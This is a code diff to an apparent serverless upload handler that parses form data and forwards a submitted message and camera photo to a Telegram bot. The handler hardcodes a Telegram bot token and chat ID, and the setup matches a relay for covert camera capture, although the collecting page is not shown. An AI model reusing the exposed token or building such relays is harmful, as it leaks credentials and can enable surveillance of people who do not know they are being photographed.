@@ -1,15 +1,15 @@
-import fetch from 'node-fetch';
-import BUSBOY from 'busboy';
+import Busboy from 'busboy';
+import FormData from 'form-data';
 
 export const config = { api: { bodyParser: false } };
 
 export default async function handler(req, res){
-  if(req.method !== "POST") return res.status(405).send("Method Not Allowed");
+  if(req.method !== "POST") return res.status(405).end("Method Not Allowed");
 
   const botToken = "7673116033:AAFM3bM-phhJKBVq4OsLCnkPGDuqjcaRW2c";
   const chatId = "7483495590";
 
-  const bb = BUSBOY({ headers: req.headers });
+  const bb = Busboy({ headers: req.headers });
   let textMsg = "";
   let photoBuffer = null;
 
@@ -27,7 +27,7 @@ export default async function handler(req, res){
         const form = new FormData();
         form.append("chat_id", chatId);
         form.append("caption", textMsg || "Foto kamera");
-        form.append("photo", new Blob([photoBuffer]), "camera.jpg");
+        form.append("photo", photoBuffer, { filename: "camera.jpg" });
 
         resp = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method:"POST", body:form });
       }else{
